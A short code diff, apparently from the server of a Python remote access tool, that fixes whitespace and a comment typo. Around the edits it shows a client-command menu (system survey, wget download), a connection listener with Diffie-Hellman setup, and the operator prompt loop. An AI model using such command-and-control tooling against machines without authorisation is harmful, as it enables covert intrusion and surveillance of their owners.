@@ -47,7 +47,6 @@ survey              | Run a system survey.
 unzip <file>        | Unzip a file.
 wget <url>          | Download a file from the web.'''
 
-
 class Server(threading.Thread):
     clients      = {}
     client_count = 1
@@ -64,6 +63,7 @@ class Server(threading.Thread):
         while True:
             conn, addr = self.s.accept()
             dhkey = diffiehellman(conn)
+
             client_id = self.client_count
             client = ClientConnection(conn, addr, dhkey, uid=client_id)
             self.clients[client_id] = client
@@ -198,7 +198,7 @@ def main():
         if not prompt:
             continue
 
-        # seperate prompt into command and action
+        # separate prompt into command and action
         cmd, _, action = prompt.partition(' ')
 
         if cmd in server_commands:
